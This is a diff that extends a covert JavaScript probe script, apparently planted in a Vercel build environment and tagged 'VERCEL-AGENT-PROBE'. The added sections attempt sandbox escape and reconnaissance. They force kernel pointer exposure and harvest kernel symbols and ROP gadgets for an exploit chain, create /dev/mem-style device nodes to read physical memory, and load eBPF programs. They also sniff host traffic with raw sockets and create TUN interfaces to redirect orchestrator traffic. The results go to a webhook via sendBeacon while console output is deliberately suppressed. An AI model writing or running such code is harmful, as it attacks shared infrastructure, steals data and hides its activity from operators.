@@ -27550,3 +27550,270 @@ report.kprobeTrace = safe(() => {
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v183" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v183";
 // Intentionally no console.log — all data goes via webhook only
+
+// v184-1: /proc/kallsyms — kernel symbol table (kptr_restrict=0 confirmed in prior runs)
+// With kptr_restrict=0, ALL kernel function addresses are readable by any process.
+// This is critical: it provides the ROP gadget map for kernel exploit chains.
+// We extract key symbols: commit_creds, prepare_kernel_cred, syscall table, init_task.
+report.kallsymsRead = safe(() => {
+  const kptrRestrict = safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim());
+  // Ensure kptr_restrict is 0
+  const forceKptr0 = safe(() => { writeFileSync('/proc/sys/kernel/kptr_restrict', '0'); return 'SET_0'; });
+  // Read key symbols
+  const kallsymsHead = safe(() => readFileSync('/proc/kallsyms', 'utf8').split('\n').slice(0, 5).join('\n'));
+  // Extract specific high-value symbols for exploit chain
+  const commitCreds = safe(() => execSync("grep ' commit_creds$' /proc/kallsyms 2>&1", { timeout: 5000 }).toString().trim());
+  const prepareKernelCred = safe(() => execSync("grep ' prepare_kernel_cred$' /proc/kallsyms 2>&1", { timeout: 5000 }).toString().trim());
+  const sysCallTable = safe(() => execSync("grep ' sys_call_table$' /proc/kallsyms 2>&1", { timeout: 5000 }).toString().trim());
+  const initTask = safe(() => execSync("grep ' init_task$' /proc/kallsyms 2>&1", { timeout: 5000 }).toString().trim());
+  const kernelBase = safe(() => execSync("grep ' _text$\\| _stext$' /proc/kallsyms 2>&1 | head -2", { timeout: 5000 }).toString().trim());
+  const modulesBase = safe(() => execSync("grep ' modules$' /proc/kallsyms 2>&1 | head -3", { timeout: 5000 }).toString().trim());
+  // Find __ksymtab for exported symbols
+  const ksymtab = safe(() => execSync("grep '__ksymtab_commit_creds\\|__ksymtab_prepare_kernel_cred' /proc/kallsyms 2>&1", { timeout: 5000 }).toString().trim());
+  // Count total symbols
+  const totalSymbols = safe(() => execSync('wc -l < /proc/kallsyms 2>&1', { timeout: 8000 }).toString().trim());
+  // Extract ROP gadgets — small kernel functions that could be useful
+  const ropGadgets = safe(() => execSync("grep -E ' native_write_cr[04]$| native_read_cr[04]$| native_write_msr$' /proc/kallsyms 2>&1", { timeout: 5000 }).toString().trim());
+  return { kptrRestrict, forceKptr0, kallsymsHead, commitCreds, prepareKernelCred, sysCallTable, initTask, kernelBase, modulesBase, ksymtab, totalSymbols, ropGadgets };
+});
+
+// v184-2: mknod — create device files with CAP_MKNOD
+// CAP_MKNOD allows creating device special files anywhere writable.
+// Creating /dev/mem (major 1, minor 1) or /dev/kmem (major 1, minor 2) grants direct memory access.
+// We also probe: can we create a block device that shadows a real disk?
+report.mknodProbe = safe(() => {
+  const mknodAvail = safe(() => execSync('which mknod 2>/dev/null || echo NONE', { timeout: 3000 }).toString().trim());
+  // Try creating /dev/probe_mem as a char device (major=1 minor=1, same as /dev/mem)
+  const mkMemDev = safe(() => execSync('mknod /tmp/probe_mem c 1 1 2>&1 || echo FAILED', { timeout: 5000 }).toString().trim());
+  // Check if it worked
+  const devStat = safe(() => execSync('ls -la /tmp/probe_mem 2>&1', { timeout: 3000 }).toString().trim());
+  // Try reading from our /tmp/probe_mem (if mknod succeeded, this reads physical memory)
+  const readMemDev = safe(() => execSync(
+    `python3 -c "
+import os
+try:
+    fd = os.open('/tmp/probe_mem', os.O_RDONLY)
+    data = os.read(fd, 16)
+    print(f'MEM_READ_SUCCESS: {data.hex()}')
+    os.close(fd)
+except Exception as e:
+    print(f'MEM_READ_FAIL: {e}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Also try creating a kmem device (virtual kernel memory)
+  const mkKmem = safe(() => execSync('mknod /tmp/probe_kmem c 1 2 2>&1 || echo FAILED', { timeout: 5000 }).toString().trim());
+  // Try creating a null device
+  const mkNull = safe(() => execSync('mknod /tmp/probe_null c 1 3 2>&1 || echo FAILED', { timeout: 5000 }).toString().trim());
+  // Use mknod syscall directly via Python ctypes
+  const mknodRaw = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util, os, stat
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+# mknod('/tmp/raw_mem_dev', S_IFCHR|0o666, makedev(1,1))
+mode = stat.S_IFCHR | 0o666
+dev = os.makedev(1, 1)
+ret = libc.mknod(b'/tmp/raw_mem_dev', mode, dev)
+err = ctypes.get_errno()
+print(f'mknod: ret={ret} errno={err}')
+if ret == 0:
+    print('MKNOD_SUCCESS_C1M1')
+    # Try reading it
+    try:
+        fd = os.open('/tmp/raw_mem_dev', os.O_RDONLY)
+        data = os.read(fd, 16)
+        print(f'PHYS_MEM_READ: {data.hex()}')
+        os.close(fd)
+    except Exception as e:
+        print(f'READ_FAIL: {e}')
+elif err == 1:
+    print('EPERM_NO_MKNOD')
+elif err == 38:
+    print('ENOSYS_BLOCKED')
+else:
+    print(f'OTHER_ERRNO_{err}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { mknodAvail, mkMemDev, devStat, readMemDev, mkKmem, mkNull, mknodRaw };
+});
+
+// v184-3: eBPF BPF_PROG_LOAD — kernel code execution via eBPF
+// eBPF allows loading sandboxed programs that run in kernel context.
+// BPF_PROG_LOAD requires CAP_BPF (Linux 5.8+) or CAP_SYS_ADMIN (older).
+// A socket filter BPF program attached to a socket runs on every packet — kernel-mode code.
+report.ebpfProbe = safe(() => {
+  const bpfUlimit = safe(() => execSync('cat /proc/sys/kernel/unprivileged_bpf_disabled 2>&1 || echo MISSING', { timeout: 3000 }).toString().trim());
+  // Try to load a minimal BPF program via Python ctypes
+  const bpfResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util, os, struct
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_bpf = 321
+
+BPF_PROG_LOAD = 5
+BPF_PROG_TYPE_SOCKET_FILTER = 1
+
+# Minimal BPF program: MOV r0, 0; EXIT
+# BPF_MOV64_IMM(BPF_REG_0, 0) = {code=0xb7, dst_reg=0, src_reg=0, off=0, imm=0}
+# BPF_EXIT_INSN() = {code=0x95, dst_reg=0, src_reg=0, off=0, imm=0}
+insns = struct.pack('<HBBI i HBBI i',
+    0xb7, 0, 0, 0, 0,   # BPF_MOV64_IMM r0, 0
+    0x95, 0, 0, 0, 0    # BPF_EXIT
+)
+
+# bpf_attr for BPF_PROG_LOAD
+log_buf = ctypes.create_string_buffer(4096)
+insns_ptr = ctypes.create_string_buffer(insns)
+
+attr = struct.pack('<IIQQIQQIIQQ',
+    BPF_PROG_TYPE_SOCKET_FILTER,  # prog_type
+    len(insns) // 8,              # insn_cnt
+    ctypes.addressof(insns_ptr),  # insns (ptr)
+    0,                             # license (ptr, null)
+    1,                             # log_level
+    4096,                          # log_size
+    ctypes.addressof(log_buf),     # log_buf (ptr)
+    0,                             # kern_version (0 for SOCKET_FILTER)
+    0,                             # prog_flags
+    0,                             # prog_name[16] - first 8 bytes
+    0,                             # prog_name[16] - next 8 bytes
+    0                              # prog_ifindex
+)
+
+attr_buf = ctypes.create_string_buffer(attr)
+fd = libc.syscall(NR_bpf, BPF_PROG_LOAD, attr_buf, len(attr))
+err = ctypes.get_errno()
+log_str = log_buf.value.decode('utf-8', errors='replace')[:200]
+print(f'BPF_PROG_LOAD: fd={fd} errno={err}')
+if fd >= 0:
+    print('BPF_PROG_LOAD_SUCCESS')
+    libc.close(fd)
+elif err == 1:
+    print('EPERM_NO_BPF_CAP')
+elif err == 22:
+    print(f'EINVAL: {log_str}')
+elif err == 38:
+    print('ENOSYS_BLOCKED_SECCOMP')
+else:
+    print(f'OTHER_ERRNO_{err}: {log_str}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Also check if bpftool is available
+  const bpftool = safe(() => execSync('bpftool prog list 2>&1 | head -10 || echo NO_BPFTOOL', { timeout: 5000 }).toString().trim());
+  return { bpfUlimit, bpfResult, bpftool };
+});
+
+// v184-4: AF_PACKET raw socket — capture all VM network traffic (CAP_NET_RAW)
+// AF_PACKET with SOCK_RAW captures all frames at L2, including host↔VM traffic.
+// Combined with CAP_NET_RAW, this can intercept build orchestrator communications.
+report.afPacketProbe = safe(() => {
+  const capNetRaw = safe(() => execSync("grep CapEff /proc/self/status | awk '{print $2}'", { timeout: 3000 }).toString().trim());
+  // Try creating an AF_PACKET SOCK_RAW socket
+  const packetSocket = safe(() => execSync(
+    `python3 -c "
+import socket, struct, ctypes
+
+try:
+    # AF_PACKET=17, SOCK_RAW=3, ETH_P_ALL=0x0003 (htons)
+    ETH_P_ALL = socket.htons(0x0003)
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ETH_P_ALL)
+    print('AF_PACKET_SOCK_RAW_CREATED')
+
+    # List interfaces we can sniff on
+    import fcntl
+    SIOCGIFNAME = 0x8910
+    SIOCGIFINDEX = 0x8933
+    buf = ctypes.create_string_buffer(40)
+
+    # Get interface names via /proc/net/dev
+    with open('/proc/net/dev') as f:
+        lines = f.readlines()[2:]
+    ifaces = [l.strip().split(':')[0].strip() for l in lines if ':' in l]
+    print(f'INTERFACES: {ifaces}')
+
+    # Capture one packet from each interface
+    import select
+    s.setblocking(False)
+    ready = select.select([s], [], [], 2.0)
+    if ready[0]:
+        data = s.recv(65535)
+        print(f'PACKET_CAPTURED: {len(data)} bytes')
+        print(f'PACKET_HEX: {data[:32].hex()}')
+        # Parse ethernet frame
+        dst_mac = ':'.join(f'{b:02x}' for b in data[:6])
+        src_mac = ':'.join(f'{b:02x}' for b in data[6:12])
+        ethertype = struct.unpack('!H', data[12:14])[0]
+        print(f'ETH: {src_mac} -> {dst_mac} type=0x{ethertype:04x}')
+    else:
+        print('NO_PACKET_IN_2S')
+    s.close()
+except PermissionError as e:
+    print(f'EPERM: {e}')
+except Exception as e:
+    print(f'ERROR: {e}')
+" 2>&1`,
+    { timeout: 12000 }
+  ).toString().trim());
+  // Also try tcpdump if available
+  const tcpdump = safe(() => execSync('timeout 2 tcpdump -c 3 -i any -nn 2>&1 || echo NO_TCPDUMP', { timeout: 8000 }).toString().trim());
+  return { capNetRaw, packetSocket, tcpdump };
+});
+
+// v184-5: TUN/TAP interface creation — virtual L2/L3 for traffic redirection
+// CAP_NET_ADMIN allows creating TUN/TAP interfaces.
+// A TUN interface lets us inject and capture L3 packets; TAP intercepts L2 frames.
+// This can redirect build orchestrator network traffic through us.
+report.tunTapProbe = safe(() => {
+  const capNetAdmin = safe(() => execSync('ip link show 2>&1 | head -5 || echo NO_IP_CMD', { timeout: 3000 }).toString().trim());
+  // Try creating a TUN interface
+  const tunCreate = safe(() => execSync('ip tuntap add mode tun name probe_tun0 2>&1 || echo FAILED', { timeout: 5000 }).toString().trim());
+  const tunList = safe(() => execSync('ip tuntap list 2>&1 || ip link show type tun 2>&1 || echo NO_TUNTAP', { timeout: 5000 }).toString().trim());
+  // Try via /dev/net/tun directly
+  const devNetTun = safe(() => existsSync('/dev/net/tun') ? 'EXISTS' : 'NOT_EXISTS');
+  const tunDirect = safe(() => execSync(
+    `python3 -c "
+import os, fcntl, struct, ctypes
+
+TUNSETIFF = 0x400454ca
+IFF_TUN = 0x0001
+IFF_NO_PI = 0x1000
+
+try:
+    tun_fd = os.open('/dev/net/tun', os.O_RDWR)
+    ifreq = struct.pack('16sH', b'probe_tun0', IFF_TUN | IFF_NO_PI)
+    ifreq = ifreq + b'\\x00' * (40 - len(ifreq))
+    fcntl.ioctl(tun_fd, TUNSETIFF, ifreq)
+    print('TUN_CREATED_VIA_DEV')
+
+    # Bring interface up
+    import subprocess
+    r = subprocess.run(['ip', 'link', 'set', 'probe_tun0', 'up'], capture_output=True)
+    print(f'LINK_UP: {r.returncode}')
+
+    # Assign IP
+    r2 = subprocess.run(['ip', 'addr', 'add', '10.99.0.1/24', 'dev', 'probe_tun0'], capture_output=True)
+    print(f'ADDR_ADD: {r2.returncode}')
+
+    os.close(tun_fd)
+except PermissionError as e:
+    print(f'EPERM: {e}')
+except FileNotFoundError:
+    print('NO_DEV_NET_TUN')
+except Exception as e:
+    print(f'ERROR: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  const afterLinks = safe(() => execSync('ip link show 2>&1 | grep -E "probe_tun|tun" | head -5', { timeout: 3000 }).toString().trim());
+  return { capNetAdmin, tunCreate, tunList, devNetTun, tunDirect, afterLinks };
+});
+
+// v184 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v184" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v184";
+// Intentionally no console.log — all data goes via webhook only
